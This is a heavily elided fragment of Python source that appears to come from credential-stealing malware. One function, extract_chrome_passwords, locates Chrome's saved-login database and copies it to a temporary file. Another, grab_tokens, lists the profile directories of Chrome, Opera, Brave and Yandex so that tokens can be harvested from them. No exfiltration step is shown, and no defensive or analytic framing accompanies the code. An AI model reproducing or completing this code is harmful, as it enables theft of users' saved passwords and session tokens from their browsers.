...
def extract_chrome_passwords():
    ...
    if not os.path.exists(login_db_path):
        return []
    temp_db_path = os.path.join(local_app_data, 'LoginDataTemp.db')
    try:
...
def grab_tokens():
    ...
    paths = {
        ...
        'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default'),
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), r'BraveSoftware\Brave-Browser\User Data\Default'),
        'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), r'Yandex\YandexBrowser\User Data\Default'),
    }
